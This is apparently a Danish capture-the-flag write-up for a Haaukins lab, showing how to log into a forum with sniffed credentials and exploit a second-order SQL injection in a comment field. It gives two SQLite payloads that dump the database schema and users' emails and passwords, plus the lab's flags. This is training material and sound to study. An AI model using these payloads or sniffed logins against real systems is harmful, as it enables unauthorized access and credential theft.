SQL injection (+ Web server login)

Second-order SQLi i et kommentarfelt med " + ||-konkatenering.

🎓 Prøv selv først. Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er fremgangsmåden der tæller.
📚 Baggrund: denne opgave bygger på en fælles teknik — læs primeren: Kom i gang: VPN, Hosts og lab-opsætning.

Web server login

Log ind med sniffede credentials (carsten@netsec.aau.dk/mormor1932). Appen bouncer http↔https: giv curl både --resolve ...:80: og :443:, send cookien, følg redirects. Det autentificerede forum viser flaget + en kommentar-form.

SQL injection — second-order i kommentarfeltet

Login-formen er parameteriseret, men en gemt kommentar er injectable. INSERT'en bruger dobbelt-citationstegn, så '-breakout fejler; brug " + SQLite ||:

" || (SELECT group_concat(sql,0x0a) FROM sqlite_master))--
" || (SELECT group_concat(email||0x3a||password,0x0a) FROM users))--

→ en skjult bruger you@found.it hvis "password" er flaget.

🚩 Vis løsning & eksempel-flag
  • Web server login: HKN{ga-wR-jNtYnh}
  • SQL injection: HKN{zN-Q3-g42fcS}

(per-instans)

Hvad du har lært

  • Injektion er ikke altid i login-formen — tænk second-order (data gemt nu, brugt i en query senere).
  • Variér breakout-tegnet: ' vs " afhænger af hvordan serveren bygger SQL'en.
